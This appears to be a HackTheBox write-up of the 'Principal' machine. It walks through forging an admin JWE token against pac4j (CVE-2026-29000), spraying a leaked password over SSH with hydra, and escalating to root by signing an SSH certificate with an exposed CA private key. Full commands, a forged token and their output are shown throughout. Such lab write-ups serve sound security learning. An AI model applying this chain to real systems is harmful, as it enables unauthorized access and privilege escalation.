---
title: "Principal @ HackTheBox"
date: 2026-03-12 09:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [hackthebox, ssh, ssh-ca, jwt, authentication-bypass, privilege-escalation]
author: andrea
image:
  path: /commons/principal.png
  no_bg: true
---


## Enumeration

Start with classical nmap scan:

```
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy Jetty
```

Browsing to the application shows a login page. The backend is built on **pac4j**,
a Java security framework that handles authentication via JWT/JWE tokens.

### JWT Authentication Bypass — CVE-2026-29000

A quick search for the framework version turns up a known vulnerability:
**CVE-2026-29000**, an authentication bypass in pac4j's JWT handling. A public
PoC is available:

- <https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc>

The flaw allows forging a valid encrypted JWT (JWE) for an arbitrary user/role,
as long as the public signing key exposed by the application (`/api/auth/jwks`)
is reachable. The PoC fetches that JWKS endpoint, builds a plain JWT claiming
`admin` / `ROLE_ADMIN`, and wraps it into a valid JWE using the server's own
public key:

```bash
python3 poc.py --jwks http://10.129.79.216:8080/api/auth/jwks --user admin --role ROLE_ADMIN
```

```
--role ROLE_ADMIN
[*] Fetching JWKS...
[+] Public key loaded
[+] PlainJWT created

=== Malicious JWE Token ===

eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.jlmGoyUc09JxIJWMy9nBaX_OOOl9LwglDGwSgH95flAVLmt_QaG6pF2y2SP-4b5Wxnp9QeOg-ci18NLx56st8zyARj1uMWXV4VJWSKO4J3vMFMAXkxXKznaDtnQO9b-_uiXZ30cd6F4-5GrZlAijoQmue5PUF6gQxzv5NyxczBhMuTPEK09gzEZurCTbBnJWFTuwtP0QFRu82XUJEcveOTkwCs3zs_Z6-wigaSjq6UTa8L6Pg4S6z4zqd8Lk6qg6hilq9UKlID16nX9JhadScbT1WcjOMtVQHk3jixxL8151w8vPUZNfqcBH-FLeM-Ezkpq_O5mLo7pRfvxs4D6Nug.fMR0wv3ConM1TCz2.R1yQIuvoi4eKyGXwatt3ZD_njO9ZhNKIHn87CkNO4I02kANbyi9eDhucpRpp83T7IZqM44kmE8FRD8-bXPE5n56iULP6MExfPxN52DQvbiGt0ePyHK5kD7pXg7AjMqZ9QEeKJSOzTwqifHB6GfWAOYO3YmeIK-AObmqOmJ98DICsuFQpgG-TAXvon7pPf2di8vjy_SvD46iybqt6wmlFfWA-fleea5xewwtuxz3AyMEjjBluWw.ZJhxJJtv_ridiNfO2sGJJg

Use it as:
Authorization: Bearer eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.jlmGoyUc09JxIJWMy9nBaX_OOOl9LwglDGwSgH95flAVLmt_QaG6pF2y2SP-4b5Wxnp9QeOg-ci18NLx56st8zyARj1uMWXV4VJWSKO4J3vMFMAXkxXKznaDtnQO9b-_uiXZ30cd6F4-5GrZlAijoQmue5PUF6gQxzv5NyxczBhMuTPEK09gzEZurCTbBnJWFTuwtP0QFRu82XUJEcveOTkwCs3zs_Z6-wigaSjq6UTa8L6Pg4S6z4zqd8Lk6qg6hilq9UKlID16nX9JhadScbT1WcjOMtVQHk3jixxL8151w8vPUZNfqcBH-FLeM-Ezkpq_O5mLo7pRfvxs4D6Nug.fMR0wv3ConM1TCz2.R1yQIuvoi4eKyGXwatt3ZD_njO9ZhNKIHn87CkNO4I02kANbyi9eDhucpRpp83T7IZqM44kmE8FRD8-bXPE5n56iULP6MExfPxN52DQvbiGt0ePyHK5kD7pXg7AjMqZ9QEeKJSOzTwqifHB6GfWAOYO3YmeIK-AObmqOmJ98DICsuFQpgG-TAXvon7pPf2di8vjy_SvD46iybqt6wmlFfWA-fleea5xewwtuxz3AyMEjjBluWw.ZJhxJJtv_ridiNfO2sGJJg

```

To use it, the token is dropped directly into the browser's session storage
(no need to intercept requests):

```
F12 -> Console -> sessionStorage.setItem('auth_token', '<forged JWE token>')
```
![alt text](/assets/img/posts/principal/token.png)

Refreshing the page grants access to the authenticated dashboard as an
administrator.

### Credential Disclosure

Inside the dashboard, an admin-only section leaks a plaintext credential:

![alt text](/assets/img/posts/principal/password.png)

```
D3pl0y_$$H_Now42!
```

The same dashboard also lists a set of usernames, presumably employees or
service accounts tied to the deployment system:

![alt text](/assets/img/posts/principal/users.png)

Users:
```
svc-deploy
jthompson
amorales
kkumar
mwilson
lzhang
bwright
```

These were saved to `users.txt` for a password-spray attempt.

### Password Spraying

With one password and a handful of usernames, the natural next step is to
check whether the leaked credential is reused anywhere — a very common
finding in real environments and in HTB machines alike.

```bash
hydra -L users.txt -p 'D3pl0y_$$H_Now42!' ssh://10.129.79.216
```

```
[22][ssh] host: 10.129.79.216   login: svc-deploy   password: D3pl0y_$$H_Now42!
```

The password matches the `svc-deploy` account. SSH access confirmed:

```bash
ssh svc-deploy@10.129.79.216
```

```
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

Foothold obtained as `svc-deploy`, member of the `deployers` group — a strong
hint that this account is tied to some kind of automated deployment process,
which becomes relevant for privilege escalation.

## Privilege Escalation

Poking around the filesystem, `svc-deploy` has access to a directory clearly
related to SSH certificate-based authentication:

```
svc-deploy@principal:/opt/principal/ssh$ ls
README.txt  ca  ca.pub
```

```
svc-deploy@principal:/opt/principal/ssh$ cat README.txt
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.
Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

The SSH daemon configuration confirms it:

```
svc-deploy@principal:/opt/principal/ssh$ cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

### Understanding the concept

`TrustedUserCAKeys` tells `sshd` to accept any user certificate signed by the
listed CA public key, regardless of what's in `authorized_keys`. In other
words, whoever holds the CA's **private** key can mint a valid SSH certificate
for *any* principal — including `root` — and `sshd` will honor it.

Here, the CA private key (`ca`) sits right next to its README on disk, and
`svc-deploy` has read access to it. There's no need to reverse-engineer
`deploy.sh` or find a way to abuse it: direct access to the CA key is enough
to impersonate any user.

### Exploitation

Generate a fresh keypair:

```bash
ssh-keygen -t rsa -f mykey -N ""
```

Sign its public key with the CA, requesting `root` as the certificate's
principal:

```bash
ssh-keygen -s /opt/principal/ssh/ca \
  -I "pwned-by-svc-deploy" \
  -n root \
  -V +52w \
  mykey.pub
```

```
Signed user key mykey-cert.pub: id "pwned-by-svc-deploy" serial 0 for root
valid from 2026-08-21T21:36:00 to 2027-08-20T21:37:00
```

Inspecting the resulting certificate confirms `root` is listed as an
authorized principal:

```bash
ssh-keygen -Lf mykey-cert.pub
```

```
mykey-cert.pub:
        Type: ssh-rsa-cert-v01@openssh.com user certificate
        Public key: RSA-CERT SHA256:Y8KCUIGJVlXOTLh83z6jd5e6KHpzvCwNA370TpXLv7I
        Signing CA: RSA SHA256:bExSfFTUaopPXEM+lTW6QM0uXnsy7CICk0+p0UKK3ps (using rsa-sha2-512)
        Key ID: "pwned-by-svc-deploy"
        Serial: 0
        Valid: from 2026-08-21T21:36:00 to 2027-08-20T21:37:00
        Principals:
                root
        Critical Options: (none)
        Extensions:
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
```

With the certificate in hand, authenticating as `root` is straightforward:

```bash
ssh -i mykey -o CertificateFile=mykey-cert.pub root@localhost
```

```
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
```
